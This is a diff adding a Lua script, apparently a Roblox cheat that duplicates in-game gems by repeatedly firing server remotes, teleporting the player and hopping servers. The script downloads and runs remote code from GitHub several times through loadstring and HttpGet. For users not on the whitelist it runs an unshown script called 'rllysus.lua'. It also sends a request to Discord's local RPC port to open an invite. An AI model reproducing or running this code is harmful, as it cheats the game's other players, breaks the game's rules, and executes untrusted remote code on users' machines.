@@ -1,0 +1,164 @@
+task.wait(4)
+repeat wait() until game:IsLoaded()
+repeat wait() until game.Players.LocalPlayer.Character:FindFirstChild("Humanoid") ~= nil
+    do  
+     safezonedestroyspace =  game:GetService("Workspace"):FindFirstChild("SafeZoneOuterSpacePart")  
+    if safezonedestroyspace then 
+    safezonedestroyspace:Destroy() 
+    end 
+    end
+
+     SafeZoneOuterSpace = Instance.new("Part",game.Workspace)
+    SafeZoneOuterSpace.Name = "SafeZoneOuterSpacePart"
+    SafeZoneOuterSpace.Size = Vector3.new(200,3,200)
+    SafeZoneOuterSpace.Position = Vector3.new((math.random(-100000, -50000)), 10000, (math.random(-100000, -50000)))
+    SafeZoneOuterSpace.Anchored = true
+asdwqelist = true
+getexecutorid = game:GetService("RbxAnalyticsService"):GetClientId()
+listedaxw = loadstring(game:HttpGet('https://raw.githubusercontent.com/Iamcutehehe/hehehe/main/whitelist.lua',true))()
+khoilistedzxwc = loadstring(game:HttpGet('https://raw.githubusercontent.com/Department123zxc/list/main/whitelist.lua',true))()
+for _, v in pairs(khoilistedzxwc) do
+    table.insert(listedaxw, v)
+end
+        for _, v1 in pairs(listedaxw) do
+            if getexecutorid == v1 then
+asdwqelist = true
+whitelistkeytype = "Whitelisted Excutor ID"
+            end
+        end
+
+userlistedzxwc = loadstring(game:HttpGet('https://raw.githubusercontent.com/Department123zxc/hello/main/list.lua',true))()
+userlistedzxwc2 = loadstring(game:HttpGet('https://raw.githubusercontent.com/Department123zxc/list/main/userid.lua',true))()
+for _, c in pairs(userlistedzxwc2) do
+    table.insert(userlistedzxwc, c)
+end
+        for _, v2 in pairs(userlistedzxwc) do
+            if game.Players.LocalPlayer.UserId and game.Players.LocalPlayer.Name == v2 then
+asdwqelist = true
+realtimechecking = true
+whitelistkeytype = "Whitelisted Account"
+            end
+        end
+
+if asdwqelist then
+_G.dupegem = true
+
+spawn(function()
+while wait() do
+pcall(function()
+if _G.dupegem then
+pcall(function()
+if game.Workspace.UserData["User_"..tostring(game.Players.LocalPlayer.UserId)].Data.BoundUnlock1.Value == true or
+game.Workspace.UserData["User_"..tostring(game.Players.LocalPlayer.UserId)].Data.BoundUnlock2.Value == true or
+game.Workspace.UserData["User_"..tostring(game.Players.LocalPlayer.UserId)].Data.BoundUnlock3.Value == true or
+game.Workspace.UserData["User_"..tostring(game.Players.LocalPlayer.UserId)].Data.BoundUnlock4.Value == true or
+game.Workspace.UserData["User_"..tostring(game.Players.LocalPlayer.UserId)].Data.BoundUnlock5.Value == true or 
+game.Workspace.UserData["User_"..tostring(game.Players.LocalPlayer.UserId)].Data.BoundUnlock6.Value == true or 
+game.Workspace.UserData["User_"..tostring(game.Players.LocalPlayer.UserId)].Data.BoundUnlock7.Value == true or
+game.Workspace.UserData["User_"..tostring(game.Players.LocalPlayer.UserId)].Data.BoundUnlock8.Value == true or
+game.Workspace.UserData["User_"..tostring(game.Players.LocalPlayer.UserId)].Data.BoundUnlock9.Value == true or
+game.Workspace.UserData["User_"..tostring(game.Players.LocalPlayer.UserId)].Data.BoundUnlock10.Value == true or
+game.Workspace.UserData["User_"..tostring(game.Players.LocalPlayer.UserId)].Data.BoundUnlock11.Value == true or
+game.Workspace.UserData["User_"..tostring(game.Players.LocalPlayer.UserId)].Data.BoundUnlock12.Value == true then
+_G.startdupe = true
+game:GetService("Players").LocalPlayer.PlayerGui.Announcement.Frame.TextLabel.Visible = true
+game:GetService("Players").LocalPlayer.PlayerGui.Announcement.Frame.Visible = true
+game:GetService("Players").LocalPlayer.PlayerGui.Announcement.Frame.TextLabel.Active = true
+game:GetService("Players").LocalPlayer.PlayerGui.Announcement.Frame.TextLabel.Visible = true
+game:GetService("Players").LocalPlayer.PlayerGui.Announcement.Frame.TextLabel.Text = true
+game:GetService("Players").LocalPlayer.PlayerGui.Announcement.Frame.TextLabel.TextColor3 = Color3.fromRGB(0, 255, 127)
+_G.dupegem = true
+end
+end)
+end
+end)
+end
+end)
+
+spawn(function()
+while wait() do
+pcall(function()
+if _G.startdupe then
+pcall(function()
+repeat task.wait()
+until game.Players.LocalPlayer.PlayerGui.Load.Frame.Visible
+pcall(function()
+if game:GetService("Players").LocalPlayer.PlayerGui.Load.Frame.Visible == true then wait(0.1)
+game:GetService("Players").LocalPlayer.Character.Weapons:FireServer()
+game:GetService("Players").LocalPlayer.PlayerGui.Load.Frame.Visible = false
+game:GetService("Players").LocalPlayer.PlayerGui.HealthBar.Frame.Visible = true
+pcall(function()
+workspace.CurrentCamera:remove()
+wait(.1)
+repeat wait() until game.Players.LocalPlayer.Character ~= nil
+workspace.CurrentCamera.CameraSubject = game.Players.LocalPlayer.Character:FindFirstChildWhichIsA('Humanoid')
+workspace.CurrentCamera.CameraType = "Custom"
+game.Players.LocalPlayer.CameraMinZoomDistance = 0.5
+game.Players.LocalPlayer.CameraMaxZoomDistance = 400
+game.Players.LocalPlayer.CameraMode = "Classic"
+game.Players.LocalPlayer.Character.Head.Anchored = false   
+end)
+wait(0.1)
+game:GetService("Players").LocalPlayer.Character.Weapons:FireServer()
+repeat wait(0.1)
+until #game:GetService("Players").LocalPlayer.Backpack:GetChildren() > 0
+wait(0.1)
+game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game:GetService("Workspace")["SafeZoneOuterSpacePart"].CFrame * CFrame.new(0, 5, 0)
+game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game:GetService("Workspace")["SafeZoneOuterSpacePart"].CFrame * CFrame.new(0, 5, 0)
+game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game:GetService("Workspace")["SafeZoneOuterSpacePart"].CFrame * CFrame.new(0, 5, 0)
+game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game:GetService("Workspace")["SafeZoneOuterSpacePart"].CFrame * CFrame.new(0, 5, 0)
+end
+end)
+wait(7)
+workspace:WaitForChild("UserData"):WaitForChild("User_"..game.Players.LocalPlayer.UserId):WaitForChild("Stats"):FireServer()
+wait(7)
+if #game.Players:GetChildren() > 1 then
+game.Players.LocalPlayer:Kick("Rejoining Server, Please Wait...")
+game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId, game:GetService("Players").LocalPlayer)   
+else
+TeleportService = game:GetService("TeleportService")
+HttpService = game:GetService("HttpService")
+PlaceId, JobId = game.PlaceId, game.JobId
+httprequest = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
+	if httprequest then
+		httprequest({
+			Url = 'http://127.0.0.1:6463/rpc?v=1',
+			Method = 'POST',
+			Headers = {
+				['Content-Type'] = 'application/json',
+				Origin = 'https://discord.com'
+			},
+			Body = HttpService:JSONEncode({
+				cmd = 'INVITE_BROWSER',
+				nonce = HttpService:GenerateGUID(false),
+				args = {code = 'dYHag43eeU'}
+			})
+		})
+	end   
+ if httprequest then
+        local servers = {}
+        local req = httprequest({Url = string.format("https://games.roblox.com/v1/games/%d/servers/Public?sortOrder=Desc&limit=100&excludeFullGames=true", PlaceId)})
+        local body = HttpService:JSONDecode(req.Body)
+
+        if body and body.data then
+            for i, v in next, body.data do
+                if type(v) == "table" and tonumber(v.playing) and tonumber(v.maxPlayers) and v.playing < v.maxPlayers and v.id ~= JobId then
+                    table.insert(servers, 1, v.id)
+                end
+            end
+        end
+
+        if #servers > 0 then
+game:GetService("Players").LocalPlayer:Kick("Hoping Server, Please Wait...")
+TeleportService:TeleportToPlaceInstance(PlaceId, servers[math.random(1, #servers)], game:GetService("Players").LocalPlayer)
+        end
+end
+end
+end)
+end
+end)
+end
+end)
+else
+loadstring(game:HttpGet('https://raw.githubusercontent.com/Iamcutehehe/hehehe/main/rllysus.lua'))()
+end
